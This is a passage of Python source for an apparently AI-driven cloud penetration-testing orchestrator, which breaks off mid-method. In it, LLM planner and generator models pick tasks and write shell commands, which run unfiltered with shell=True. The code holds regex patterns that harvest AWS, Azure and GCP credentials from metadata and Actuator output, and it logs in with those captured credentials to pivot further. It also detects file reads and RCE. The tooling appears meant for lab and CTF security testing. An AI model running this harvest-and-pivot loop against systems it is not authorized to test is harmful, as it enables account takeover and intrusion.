#!/usr/bin/env python3
"""
Cloud Auto Pentest - AI-Driven Real Cloud Pipeline

ALL decisions are made by the Planner/Generator AI models.
This pipeline ONLY:
1. Sends state to Planner API → receives tasks
2. Sends tasks to Generator API → receives CLI commands
3. Executes commands via Executor
4. Parses output (credential extraction, flag detection)
5. Updates state and feeds back to Planner

The pipeline does NOT decide what to scan, what to exploit, or what order.
That intelligence comes entirely from the Planner/Generator models.

Usage (the Planner/Generator are served by any OpenAI-compatible endpoint;
configure API_URL / API_KEY via env vars or the CLI flags below):

    # Web target
    python -m cage_cloud.orchestrator \
        --api-url "$API_URL" --api-key "$API_KEY" \
        --target-url "http://localhost:8080" \
        --target "Spring Boot Actuator, found /actuator endpoints exposed"

    # AWS scenario (synthetic lab credentials only)
    python -m cage_cloud.orchestrator \
        --api-url "$API_URL" --api-key "$API_KEY" \
        --target "Pentest AWS account" \
        --aws-profile my-lab-profile
"""

import argparse
import copy
import json
import logging
import os
import re
import shlex
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests
from cage_cloud.schema import BudgetSnapshot

# RAG Integration
try:
    from cage_cloud.rag.integration import RAGIntegration
    _rag_instance = RAGIntegration()
    RAG_AVAILABLE = True
except Exception:
    RAG_AVAILABLE = False
    _rag_instance = None

# Graph state (v2 — full persistent graph with failure tracking)
try:
    from cage_cloud.graph import build_graph_lite_state, progress_signature
    GRAPH_LITE_AVAILABLE = True
except Exception:
    GRAPH_LITE_AVAILABLE = False
    build_graph_lite_state = None
    progress_signature = None

# Skill Router — few-shot retrieval for Planner
try:
    from cage_cloud.skill_router import (
        route_planner_skill,
        infer_provider,
        infer_stack,
        retrieve_planner_examples,
        format_planner_fewshot_block,
        load_planner_examples,
    )
    SKILL_ROUTER_AVAILABLE = True
    _PLANNER_EXAMPLES_CACHE = load_planner_examples()
except Exception:
    SKILL_ROUTER_AVAILABLE = False
    _PLANNER_EXAMPLES_CACHE = []

# Rule-based evidence verifier (v2 — 17-objective verifier)
try:
    from cage_cloud.verifier import verify_task_execution
    EVIDENCE_VERIFIER_AVAILABLE = True
except Exception:
    EVIDENCE_VERIFIER_AVAILABLE = False
    verify_task_execution = None

# Deterministic commit gate for authoritative state
try:
    from cage_cloud.state_commit import finalize_transition
    STATE_COMMIT_AVAILABLE = True
except Exception:
    STATE_COMMIT_AVAILABLE = False
    finalize_transition = None

# Scope guard for executor-side enforcement
try:
    from cage_cloud.scope_guard import ScopeGuard, ScopePolicy
    SCOPE_GUARD_AVAILABLE = True
except Exception:
    SCOPE_GUARD_AVAILABLE = False
    ScopeGuard = None
    ScopePolicy = None

# =============================================================================
# Logging
# =============================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)


# =============================================================================
# Credential & Flag Extractor (passive parsing — NOT decision-making)
# =============================================================================
class OutputParser:
    """
    Passively parses command output to extract credentials, flags, and findings.
    This is NOT decision-making — it's sensing/perception.
    Supports AWS, Azure, and GCP credential extraction.
    """

    # ── AWS patterns ──
    AWS_ACCESS_KEY_RE = re.compile(
        r"(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"
    )
    AWS_SECRET_RE = re.compile(
        r'(?i)(?:SecretAccessKey|aws.?secret.?access.?key|secret.?access.?key)'
        r'\s*["\s:=]+\s*([A-Za-z0-9/+=]{40})'
    )
    AWS_SESSION_RE = re.compile(
        r'(?i)(?:Token|aws.?session.?token|session.?token)'
        r'\s*["\s:=]+\s*([A-Za-z0-9/+=]{20,})'
    )
    AWS_REGION_RE = re.compile(
        r'(?i)(?:aws.?region|aws.?default.?region)\s*[=:]\s*["\']?'
        r'([a-z]{2}-[a-z]+-\d)["\']?'
    )

    # ── Azure patterns ──
    AZURE_CLIENT_ID_RE = re.compile(
        r'(?i)(?:AZURE_CLIENT_ID|azure.?client.?id|appId|client_id)'
        r'\s*["\s:=]+\s*"?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"?'
    )
    AZURE_CLIENT_SECRET_RE = re.compile(
        r'(?i)(?:AZURE_CLIENT_SECRET|azure.?client.?secret|password|clientSecret)'
        r'\s*["\s:=]+\s*"?([A-Za-z0-9~._-]{30,})"?'
    )
    AZURE_TENANT_ID_RE = re.compile(
        r'(?i)(?:AZURE_TENANT_ID|azure.?tenant.?id|tenantId|tenant)'
        r'\s*["\s:=]+\s*"?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"?'
    )
    AZURE_SUBSCRIPTION_RE = re.compile(
        r'(?i)(?:AZURE_SUBSCRIPTION_ID|subscriptionId|subscription.?id)'
        r'\s*["\s:=]+\s*"?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"?'
    )

    # ── GCP patterns ──
    GCP_SERVICE_ACCOUNT_RE = re.compile(
        r'(?i)(?:client_email|service.?account)\s*["\s:=]+\s*"?'
        r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.iam\.gserviceaccount\.com)"?'
    )
    GCP_PROJECT_RE = re.compile(
        r'(?i)(?:project_id|GCLOUD_PROJECT|GCP_PROJECT|GOOGLE_CLOUD_PROJECT)'
        r'\s*["\s:=]+\s*"?([a-z][a-z0-9-]{4,28}[a-z0-9])"?'
    )
    GCP_PRIVATE_KEY_RE = re.compile(
        r'(?i)private_key\s*[":=]+\s*"(-----BEGIN [A-Z ]+ KEY-----[^"]+-----END [A-Z ]+ KEY-----)"'
    )

    FLAG_PATTERNS = [
        re.compile(r"wiz\{[^}]+\}", re.IGNORECASE),
        re.compile(r"FLAG\{[^}]+\}", re.IGNORECASE),
        re.compile(r"ctf\{[^}]+\}", re.IGNORECASE),
        re.compile(r"W1\{[^}]+\}"),
        re.compile(r"flag-[A-Za-z0-9_-]{4,}", re.IGNORECASE),
        # Common CTF flag formats without curly braces (e.g., WIZ_CTF_...)
        re.compile(r"WIZ_CTF_[A-Za-z0-9_]+"),
        # "The flag is: XXXXX" pattern
        re.compile(r"(?:The flag is:\s*)([A-Za-z0-9_\-{}]+)", re.IGNORECASE),
    ]

    @classmethod
    def extract_credentials(cls, text: str) -> Dict[str, str]:
        """Extract ALL cloud credentials (AWS + Azure + GCP) from any text."""
        creds = {}
        if not text:
            return creds

        # ── AWS ──
        aws = cls._extract_aws(text)
        creds.update(aws)

        # ── Azure ──
        azure = cls._extract_azure(text)
        creds.update(azure)

        # ── GCP ──
        gcp = cls._extract_gcp(text)
        creds.update(gcp)

        return creds

    @classmethod
    def _extract_aws(cls, text: str) -> Dict[str, str]:
        """Extract AWS credentials from text."""
        creds = {}

        # Try JSON parse first (IMDS metadata response format)
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if "AccessKeyId" in data:
                    creds["AWS_ACCESS_KEY_ID"] = data["AccessKeyId"]
                    creds["AWS_SECRET_ACCESS_KEY"] = data.get("SecretAccessKey", "")
                    creds["AWS_SESSION_TOKEN"] = data.get("Token", "")
                    return creds
                # Handle Credentials wrapper (e.g. cognito get-credentials-for-identity)
                if "Credentials" in data:
                    c = data["Credentials"]
                    creds["AWS_ACCESS_KEY_ID"] = c.get("AccessKeyId", "")
                    creds["AWS_SECRET_ACCESS_KEY"] = c.get("SecretAccessKey", "")
                    creds["AWS_SESSION_TOKEN"] = c.get("SessionToken", c.get("Token", ""))
                    return creds
                # Handle nested role-name key (IMDS: {"role-name": {AccessKeyId: ...}})
                for v in data.values():
                    if isinstance(v, dict) and "AccessKeyId" in v:
                        creds["AWS_ACCESS_KEY_ID"] = v["AccessKeyId"]
                        creds["AWS_SECRET_ACCESS_KEY"] = v.get("SecretAccessKey", "")
                        creds["AWS_SESSION_TOKEN"] = v.get("Token", v.get("SessionToken", ""))
                        return creds
        except (json.JSONDecodeError, TypeError, AttributeError):
            pass

        # Regex extraction
        ak = cls.AWS_ACCESS_KEY_RE.search(text)
        if ak:
            creds["AWS_ACCESS_KEY_ID"] = ak.group(0)
        sk = cls.AWS_SECRET_RE.search(text)
        if sk:
            creds["AWS_SECRET_ACCESS_KEY"] = sk.group(1)
        st = cls.AWS_SESSION_RE.search(text)
        if st:
            creds["AWS_SESSION_TOKEN"] = st.group(1)
        rg = cls.AWS_REGION_RE.search(text)
        if rg:
            creds["AWS_DEFAULT_REGION"] = rg.group(1)
        return creds

    @classmethod
    def _extract_azure(cls, text: str) -> Dict[str, str]:
        """Extract Azure credentials from text."""
        creds = {}

        # Try JSON (az ad sp create-for-rbac output)
        try:
            data = json.loads(text)
            if "appId" in data:
                creds["AZURE_CLIENT_ID"] = data["appId"]
                creds["AZURE_CLIENT_SECRET"] = data.get("password", "")
                creds["AZURE_TENANT_ID"] = data.get("tenant", "")
                return creds
        except (json.JSONDecodeError, TypeError, AttributeError):
            pass

        # Regex
        m = cls.AZURE_CLIENT_ID_RE.search(text)
        if m:
            creds["AZURE_CLIENT_ID"] = m.group(1)
        m = cls.AZURE_CLIENT_SECRET_RE.search(text)
        if m:
            creds["AZURE_CLIENT_SECRET"] = m.group(1)
        m = cls.AZURE_TENANT_ID_RE.search(text)
        if m:
            creds["AZURE_TENANT_ID"] = m.group(1)
        m = cls.AZURE_SUBSCRIPTION_RE.search(text)
        if m:
            creds["AZURE_SUBSCRIPTION_ID"] = m.group(1)
        return creds

    @classmethod
    def _extract_gcp(cls, text: str) -> Dict[str, str]:
        """Extract GCP credentials from text."""
        creds = {}

        # Try JSON (service account key file format)
        try:
            data = json.loads(text)
            if "client_email" in data and "private_key" in data:
                creds["GCP_SERVICE_ACCOUNT_EMAIL"] = data["client_email"]
                creds["GCP_PROJECT_ID"] = data.get("project_id", "")
                creds["GCP_SERVICE_ACCOUNT_KEY_JSON"] = text
                return creds
        except (json.JSONDecodeError, TypeError, AttributeError):
            pass

        # Regex
        m = cls.GCP_SERVICE_ACCOUNT_RE.search(text)
        if m:
            creds["GCP_SERVICE_ACCOUNT_EMAIL"] = m.group(1)
        m = cls.GCP_PROJECT_RE.search(text)
        if m:
            creds["GCP_PROJECT_ID"] = m.group(1)
        return creds

    # Keep backward compatibility
    @classmethod
    def extract_aws_credentials(cls, text: str) -> Dict[str, str]:
        """Extract AWS credentials (backward compatible)."""
        return cls._extract_aws(text)

    @classmethod
    def extract_flags(cls, text: str) -> List[str]:
        """Extract CTF flags from any text."""
        flags = []
        if not text:
            return flags
        for pattern in cls.FLAG_PATTERNS:
            for m in pattern.finditer(text):
                # Use capture group if present (e.g., "The flag is: XXX"), else full match
                flag = m.group(1) if m.lastindex else m.group(0)
                if flag and flag not in flags:
                    flags.append(flag)
        return flags

    _REDACT_PATTERNS = [
        (re.compile(r"(SecretAccessKey[\"':\s=]+)[A-Za-z0-9/+=]{20,}"), r"\1****"),
        (re.compile(r"(AWS_SECRET_ACCESS_KEY=)[^\s&]+"), r"\1****"),
        (re.compile(r"(Token[\"':\s=]+)[A-Za-z0-9/+=]{20,}"), r"\1****"),
        (re.compile(r"(AWS_SESSION_TOKEN=)[^\s&]+"), r"\1****"),
        (re.compile(r"(password[\"':\s=]+)[^\s\"',}]+", re.IGNORECASE), r"\1****"),
        (re.compile(r"(client.secret[\"':\s=]+)[^\s\"',}]+", re.IGNORECASE), r"\1****"),
        (re.compile(r"(private.key[\"':\s=]+)[^\s\"',}]+", re.IGNORECASE), r"\1****"),
    ]

    @classmethod
    def _redact_secrets(cls, text: str) -> str:
        """Mask secret values in text to prevent credential leakage in findings/reports."""
        for pattern, replacement in cls._REDACT_PATTERNS:
            text = pattern.sub(replacement, text)
        return text

    @classmethod
    def extract_findings(cls, command: str, stdout: str, stderr: str) -> List[str]:
        """Extract key findings from command output. Supports AWS, Azure, GCP."""
        findings = []
        if not stdout:
            return findings

        cmd_lower = command.lower()

        # ── AWS findings ──
        if "list-buckets" in cmd_lower or "s3 ls" in cmd_lower:
            for line in stdout.strip().split("\n"):
                if line.strip():
                    findings.append(f"S3: {line.strip()}")
        elif "get-caller-identity" in cmd_lower:
            findings.append(f"AWS Identity: {cls._redact_secrets(stdout.strip()[:200])}")
        elif "security-credentials" in cmd_lower and "meta-data" in cmd_lower:
            role = stdout.strip()
            if role and not role.startswith("{") and not role.startswith("<"):
                findings.append(f"IAM Role: {role}")

        # ── Azure findings ──
        elif "az account show" in cmd_lower or "az account list" in cmd_lower:
            findings.append(f"Azure Account: {stdout.strip()[:300]}")
        elif "az group list" in cmd_lower:
            try:
                data = json.loads(stdout)
                for rg in data[:20]:
                    findings.append(f"Azure RG: {rg.get('name', '?')} ({rg.get('location', '?')})")
            except (json.JSONDecodeError, TypeError):
                pass
        elif "az storage account list" in cmd_lower:
            try:
                data = json.loads(stdout)
                for sa in data[:20]:
                    findings.append(f"Azure Storage: {sa.get('name', '?')}")
            except (json.JSONDecodeError, TypeError):
                pass
        elif "az keyvault list" in cmd_lower:
            try:
                data = json.loads(stdout)
                for kv in data[:20]:
                    findings.append(f"Azure KeyVault: {kv.get('name', '?')}")
            except (json.JSONDecodeError, TypeError):
                pass
        elif "az vm list" in cmd_lower:
            try:
                data = json.loads(stdout)
                for vm in data[:20]:
                    findings.append(f"Azure VM: {vm.get('name', '?')} ({vm.get('location', '?')})")
            except (json.JSONDecodeError, TypeError):
                pass

        # ── GCP findings ──
        elif "gcloud config list" in cmd_lower:
            findings.append(f"GCP Config: {stdout.strip()[:300]}")
        elif "gcloud projects list" in cmd_lower:
            for line in stdout.strip().split("\n")[1:]:  # Skip header
                if line.strip():
                    findings.append(f"GCP Project: {line.strip()}")
        elif "gsutil ls" in cmd_lower or "gcloud storage buckets list" in cmd_lower:
            for line in stdout.strip().split("\n"):
                if line.strip():
                    findings.append(f"GCS Bucket: {line.strip()}")
        elif "gcloud compute instances list" in cmd_lower:
            for line in stdout.strip().split("\n")[1:]:  # Skip header
                if line.strip():
                    findings.append(f"GCE Instance: {line.strip()}")
        elif "gcloud secrets list" in cmd_lower:
            for line in stdout.strip().split("\n")[1:]:
                if line.strip():
                    findings.append(f"GCP Secret: {line.strip()}")
        elif "gcloud iam service-accounts list" in cmd_lower:
            for line in stdout.strip().split("\n")[1:]:
                if line.strip():
                    findings.append(f"GCP SA: {line.strip()}")

        # ── Web / Actuator findings ──
        elif "actuator/env" in cmd_lower:
            try:
                data = json.loads(stdout)
                for ps in data.get("propertySources", []):
                    if ps.get("name") == "systemEnvironment":
                        for k, v in ps.get("properties", {}).items():
                            val = v.get("value", "") if isinstance(v, dict) else str(v)
                            if val and val != "******":
                                findings.append(f"ENV: {k}={val}")
            except (json.JSONDecodeError, AttributeError):
                pass
        elif "actuator/mappings" in cmd_lower:
            try:
                data = json.loads(stdout)
                for ctx_name, ctx_val in data.get("contexts", {}).items():
                    mappings = ctx_val.get("mappings", {})
                    for mtype, mlist in mappings.items():
                        if isinstance(mlist, dict):
                            for k, v in mlist.items():
                                if isinstance(v, list):
                                    for m in v:
                                        pred = m.get("predicate", "")
                                        if pred and "/actuator" not in pred and "/error" not in pred:
                                            findings.append(f"Route: {pred}")
            except (json.JSONDecodeError, AttributeError):
                pass

        # ── Azure metadata ──
        elif "169.254.169.254/metadata" in cmd_lower and "metadata=true" in cmd_lower:
            findings.append(f"Azure Metadata: {stdout.strip()[:300]}")

        # ── GCP metadata ──
        elif "metadata.google.internal" in cmd_lower:
            findings.append(f"GCP Metadata: {stdout.strip()[:300]}")

        # ── Web CVE: file read / RCE / info disclosure ──
        if re.search(r"root:x?:0:0:", stdout):
            findings.append(f"CRITICAL: /etc/passwd file read confirmed via {command[:80]}")
        if re.search(r"uid=\d+\(", stdout):
            findings.append(f"CRITICAL: RCE confirmed (id output) via {command[:80]}")
        if re.search(r"MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|MINIO_SECRET_KEY", stdout):
            findings.append(f"CRITICAL: MinIO credentials leaked via {command[:80]}")
        if re.search(r'"ApiVersion"\s*:', stdout) and re.search(r'"ServerVersion"\s*:', stdout):
            findings.append(f"CRITICAL: Docker API exposed via {command[:80]}")
        if re.search(r"CVE-\d{4}-\d+.*VERIFIED", stdout):
            findings.append(f"CRITICAL: CVE exploit verified via {command[:80]}")
        if re.search(r"X-Cmd-Response:.*uid=", stdout):
            findings.append(f"CRITICAL: RCE via response header injection via {command[:80]}")
        if re.search(r"root:\$[0-9a-z]\$", stdout):
            findings.append(f"CRITICAL: /etc/shadow file read via {command[:80]}")

        # ── Generic: short meaningful output (skip noise) ──
        if not findings and len(stdout.strip()) < 500 and stdout.strip():
            text = stdout.strip()[:300]
            skip = (
                re.search(r"export\s+AWS_\w+=", text)
                or text.lstrip().startswith(("<html", "<!DOCTYPE", "<?xml"))
                or re.match(r"^(curl|wget):\s", text)
                or re.match(r"^\s*\d+\s+\d+\s+\d+\s", text)  # curl progress table
                or text.lower() in ("ok", "true", "false", "null", "{}", "[]", "")
                or re.match(r"^(No |Cannot |Could not |Error|error:|failed)", text, re.IGNORECASE)
            )
            if not skip:
                findings.append(f"Output: {text}")

        return [cls._redact_secrets(f) for f in findings]

    @classmethod
    def extract_secrets(cls, text: str, source: str = "") -> List[str]:
        """Extract generic secrets/interesting values."""
        secrets = []
        keywords = ["password", "secret", "token", "api_key", "private_key", "credential"]
        for kw in keywords:
            pat = re.compile(rf'(?i){kw}\s*[=:]\s*["\']?([^\s"\',$]+)["\']?')
            for m in pat.finditer(text):
                val = m.group(1)
                if val and val != "******" and not all(c == "*" for c in val):
                    if val.lower() not in ("null", "none", "n/a", ""):
                        secrets.append(f"{kw}={val[:50]} (from {source})")
        return secrets


# =============================================================================
# Command Executor (NO LocalStack — real multi-cloud)
# =============================================================================
class RealExecutor:
    """Execute commands against REAL cloud targets. Supports AWS, Azure, GCP CLIs."""

    MAX_OUTPUT_BYTES = 512 * 1024  # 512 KB per stream — prevents OOM on large outputs
    HTTP_TOOLS = ("curl", "wget", "http", "https")
    _DYNAMIC_ENV_KEYS = {
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "AWS_DEFAULT_REGION",
        "AZURE_CLIENT_ID",
        "AZURE_CLIENT_SECRET",
        "AZURE_TENANT_ID",
        "AZURE_SUBSCRIPTION_ID",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "GCP_PROJECT",
        "GOOGLE_CLOUD_PROJECT",
    }

    def __init__(
        self,
        cloud_env: Optional[Dict[str, str]] = None,
        aws_profile: Optional[str] = None,
        gcp_project: Optional[str] = None,
        azure_subscription: Optional[str] = None,
        scope_guard: Optional["ScopeGuard"] = None,
        timeout: int = 30,
    ):
        self.cloud_env = cloud_env or {}
        self.base_cloud_env = dict(self.cloud_env)
        self.aws_profile = aws_profile
        self.gcp_project = gcp_project
        self.azure_subscription = azure_subscription
        self.scope_guard = scope_guard
        self.timeout = timeout
        self.tool_calls_used = 0
        self.http_requests_used = 0
        self.started_at = time.monotonic()
        self._gcp_key_file = None  # Temp file for GCP SA key

    def update_credentials(self, creds: Dict[str, str]):
        """Update cloud credentials from extracted values (AWS/Azure/GCP)."""
        for k, v in creds.items():
            if v and k != "GCP_SERVICE_ACCOUNT_KEY_JSON":
                self.cloud_env[k] = v

        # Handle GCP service account key JSON → activate it
        if "GCP_SERVICE_ACCOUNT_KEY_JSON" in creds:
            self._activate_gcp_service_account(creds["GCP_SERVICE_ACCOUNT_KEY_JSON"])

        # Handle Azure credentials → login
        if all(k in creds for k in ["AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID"]):
            self._azure_sp_login(creds)

        # Log (masked)
        masked = {}
        for k, v in creds.items():
            if "SECRET" in k.upper() or "KEY" in k.upper() or "PASSWORD" in k.upper():
                masked[k] = "****"
            elif "JSON" in k.upper():
                masked[k] = "<json>"
            else:
                masked[k] = v[:12] + "..." if len(v) > 12 else v
        logger.info(f"  🔑 Credentials updated: {masked}")

    def set_confirmed_credentials(self, creds: Dict[str, str]):
        """Reset executor environment to the last confirmed credential set."""
        self.cloud_env = dict(self.base_cloud_env)
        for key in self._DYNAMIC_ENV_KEYS:
            self.cloud_env.pop(key, None)
        if creds:
            self.update_credentials(creds)

    def _budget_snapshot(self) -> BudgetSnapshot:
        return BudgetSnapshot(
            llm_requests_used=0,
            llm_tokens_used=0,
            http_requests_used=self.http_requests_used,
            tool_calls_used=self.tool_calls_used,
            elapsed_seconds=max(0.0, time.monotonic() - self.started_at),
        )

    def _activate_gcp_service_account(self, key_json: str):
        """Write GCP SA key to temp file and activate."""
        import tempfile
        try:
            f = tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False)
            f.write(key_json)
            f.close()
            self._gcp_key_file = f.name
            self.cloud_env["GOOGLE_APPLICATION_CREDENTIALS"] = f.name
            # Also try to activate via gcloud
            result = self.run(f"gcloud auth activate-service-account --key-file={shlex.quote(f.name)}")
            if result["success"]:
                logger.info("  ✅ GCP service account activated")
        except Exception as e:
            logger.warning(f"  ⚠️ GCP SA activation failed: {e}")

    def _azure_sp_login(self, creds: Dict[str, str]):
        """Login to Azure with service principal credentials."""
        try:
            cmd = (
                f"az login --service-principal "
                f"-u {shlex.quote(creds['AZURE_CLIENT_ID'])} "
                f"-p {shlex.quote(creds['AZURE_CLIENT_SECRET'])} "
                f"--tenant {shlex.quote(creds['AZURE_TENANT_ID'])}"
            )
            result = self.run(cmd)
            if result["success"]:
                logger.info("  ✅ Azure SP login successful")
        except Exception as e:
            logger.warning(f"  ⚠️ Azure SP login failed: {e}")

    def run(self, command: str) -> Dict[str, Any]:
        """Execute a command and return structured result."""
        # Add AWS profile if specified
        if self.aws_profile and command.strip().startswith("aws "):
            if "--profile" not in command:
                command = command.replace("aws ", f"aws --profile {shlex.quote(self.aws_profile)} ", 1)

        # Add GCP project if specified
        if self.gcp_project and command.strip().startswith("gcloud "):
            if "--project" not in command:
                command += f" --project {shlex.quote(self.gcp_project)}"

        # Add Azure subscription if specified
        if self.azure_subscription and command.strip().startswith("az "):
            if "--subscription" not in command:
                command += f" --subscription {shlex.quote(self.azure_subscription)}"

        try:
            env = os.environ.copy()
            env.update(self.cloud_env)

            if self.scope_guard:
                target_urls = self.scope_guard.extract_network_targets(command)
                decision = self.scope_guard.check_action(
                    command=command,
                    target_urls=target_urls,
                    budget=self._budget_snapshot(),
                )
                if not decision.allowed:
                    return {
                        "command": command,
                        "return_code": -1,
                        "stdout": "",
                        "stderr": decision.reason,
                        "success": False,
                        "failure_class": "scope_block",
                        "scope_decision": decision.to_dict(),
                    }

            cmd_timeout = self.timeout
            cmd_lower = command.lower()
            if any(kw in cmd_lower for kw in [
                "openssl s_client", "nmap ", "dig +trace", "nikto ",
                "sslscan ", "testssl", "gobuster ", "ffuf ",
                "crt.sh", "shodan", "censys",
                "aws ", "az ", "gcloud ",
            ]):
                cmd_timeout = max(self.timeout, 60)

            self.tool_calls_used += 1
            if command.strip().lower().startswith(self.HTTP_TOOLS):
                self.http_requests_used += 1
            proc = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=cmd_timeout,
                env=env,
            )
            stdout = proc.stdout or ""
            stderr = proc.stderr or ""
            if len(stdout) > self.MAX_OUTPUT_BYTES:
                stdout = stdout[:self.MAX_OUTPUT_BYTES] + f"\n... [truncated at {self.MAX_OUTPUT_BYTES} bytes]"
            if len(stderr) > self.MAX_OUTPUT_BYTES:
                stderr = stderr[:self.MAX_OUTPUT_BYTES] + f"\n... [truncated at {self.MAX_OUTPUT_BYTES} bytes]"
            result = {
                "command": command,
                "return_code": proc.returncode,
                "stdout": stdout.strip(),
                "stderr": stderr.strip(),
                "success": proc.returncode == 0,
            }
            # Auto-retry aws s3 commands with --no-sign-request on credential errors
            if (not result["success"]
                    and "aws s3" in command
                    and "--no-sign-request" not in command
                    and "Unable to locate credentials" in result["stderr"]):
                retry_cmd = command.rstrip() + " --no-sign-request"
                logger.info(f"      🔄 Auto-retry with --no-sign-request: {retry_cmd[:100]}")
                retry_proc = subprocess.run(
                    retry_cmd, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True, timeout=self.timeout, env=env,
                )
                r_stdout = retry_proc.stdout or ""
                r_stderr = retry_proc.stderr or ""
                if len(r_stdout) > self.MAX_OUTPUT_BYTES:
                    r_stdout = r_stdout[:self.MAX_OUTPUT_BYTES] + f"\n... [truncated]"
                if len(r_stderr) > self.MAX_OUTPUT_BYTES:
                    r_stderr = r_stderr[:self.MAX_OUTPUT_BYTES] + f"\n... [truncated]"
                result = {
                    "command": retry_cmd,
                    "return_code": retry_proc.returncode,
                    "stdout": r_stdout.strip(),
                    "stderr": r_stderr.strip(),
                    "success": retry_proc.returncode == 0,
                }
            return result
        except subprocess.TimeoutExpired:
            return {
                "command": command, "return_code": -1,
                "stdout": "", "stderr": f"Timeout ({cmd_timeout}s)",
                "success": False,
            }
        except Exception as e:
            return {
                "command": command, "return_code": -1,
                "stdout": "", "stderr": str(e),
                "success": False,
            }

    def close(self):
        """Cleanup temp files."""
        if self._gcp_key_file:
            try:
                os.unlink(self._gcp_key_file)
            except OSError:
                pass


# =============================================================================
# API Client for Planner/Generator
# =============================================================================
class PlannerGeneratorAPI:
    """Client for the Planner/Generator AI models."""

    def __init__(
        self,
        api_url: str,
        api_key: str,
        timeout: int = 600,
        planner_api_url: Optional[str] = None,
        generator_api_url: Optional[str] = None,
        planner_api_key: Optional[str] = None,
        generator_api_key: Optional[str] = None,
        planner_model: Optional[str] = None,
        generator_model: Optional[str] = None,
    ):
        self.api_url = api_url.rstrip("/")
        self.planner_api_url = (planner_api_url or self.api_url).rstrip("/")
        self.generator_api_url = (generator_api_url or self.api_url).rstrip("/")
        self.planner_api_key = planner_api_key or api_key
        self.generator_api_key = generator_api_key or api_key
        self.timeout = timeout
        self.planner_model = planner_model
        self.generator_model = generator_model
        self._last_failure_reason: Optional[str] = None
        self.llm_metrics = {
            "total_requests": 0,
            "planner_requests": 0,
            "generator_requests": 0,
            "total_input_tokens": 0,
            "total_output_tokens": 0,
            "total_tokens": 0,
            "calls": [],
        }
        self.planner_headers = {
            "x-api-key": self.planner_api_key,
            "Authorization": f"Bearer {self.planner_api_key}",
            "Content-Type": "application/json",
            "bypass-tunnel-reminder": "true",
        }
        self.generator_headers = {
            "x-api-key": self.generator_api_key,
            "Authorization": f"Bearer {self.generator_api_key}",
            "Content-Type": "application/json",
            "bypass-tunnel-reminder": "true",
        }

    def health_check(self, retries: int = 5, delay: float = 10.0) -> bool:
        ok = True
        for role, url, headers in [
            ("planner", self.planner_api_url, self.planner_headers),
            ("generator", self.generator_api_url, self.generator_headers),
        ]:
            role_ok = False
            for attempt in range(retries):
                try:
                    r = requests.get(f"{url}/models", headers=headers, timeout=30)
                    if r.status_code == 200:
                        role_ok = True
                        break
                    logger.warning(f"{role} API health check attempt {attempt + 1}/{retries} failed ({r.status_code}) at {url}")
                except Exception as e:
                    logger.warning(f"{role} API health check attempt {attempt + 1}/{retries} failed at {url}: {e}")
                if attempt < retries - 1:
                    time.sleep(delay)
            if not role_ok:
                logger.error(f"{role} API health check failed after {retries} attempts at {url}")
            ok = ok and role_ok
        return ok

    @staticmethod
    def _parse_sse(text: str) -> Dict:
        """Reassemble an OpenAI-style SSE stream into a single response dict.

        Some proxies (e.g. certain gpt-5.4 gateways) return SSE chunks even
        for non-stream requests, so plain r.json() fails. This rebuilds the
        equivalent {choices:[{message:{content}}], usage:{}} structure.
        """
        content = ""
        usage: Dict = {}
        for line in text.splitlines():
            line = line.strip()
            if not line.startswith("data:"):
                continue
            payload = line[len("data:"):].strip()
            if not payload or payload == "[DONE]":
                continue
            try:
                chunk = json.loads(payload)
            except ValueError:
                continue
            if chunk.get("usage"):
                usage = chunk["usage"]
            for ch in chunk.get("choices", []):
                piece = ((ch.get("delta") or {}).get("content")
                         or (ch.get("message") or {}).get("content") or "")
                content += piece
        return {"choices": [{"message": {"content": content}}], "usage": usage}

    def _chat_completions(self, api_url: str, headers: Dict, model: str, system_prompt: str, user_prompt: str, role: str = "unknown") -> Optional[str]:
        messages = [
            {"role": "user", "content": system_prompt + "\n\n" + user_prompt},
        ] if system_prompt else [
            {"role": "user", "content": user_prompt},
        ]
        payload = {
            "model": model or "claude-haiku-4.5",
            "messages": messages,
            "temperature": 0.3,
            "max_tokens": 4096,
        }
        try:
            r = requests.post(
                f"{api_url}/chat/completions",
                json=payload,
                headers=headers,
                timeout=min(self.timeout, 60),
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                except ValueError:
                    data = self._parse_sse(r.text)
                choices = data.get("choices") or []
                content = ""
                if choices:
                    msg = choices[0].get("message") or {}
                    content = (msg.get("content")
                               or (choices[0].get("delta") or {}).get("content") or "")
                if not content.strip():
                    logger.warning("  ⚠️ Chat API returned empty content (model degraded?)")
                    return None
                usage = data.get("usage", {})
                inp = usage.get("prompt_tokens", 0)
                out = usage.get("completion_tokens", 0)
                self.llm_metrics["total_requests"] += 1
                self.llm_metrics["total_input_tokens"] += inp
                self.llm_metrics["total_output_tokens"] += out
                self.llm_metrics["total_tokens"] += inp + out
                if role == "planner":
                    self.llm_metrics["planner_requests"] += 1
                elif role == "generator":
                    self.llm_metrics["generator_requests"] += 1
                self.llm_metrics["calls"].append({
                    "role": role, "input_tokens": inp,
                    "output_tokens": out, "model": model or "claude-haiku-4.5",
                })
                return content
            else:
                logger.warning(f"  ⚠️ Chat API returned {r.status_code}: {r.text[:200]}")
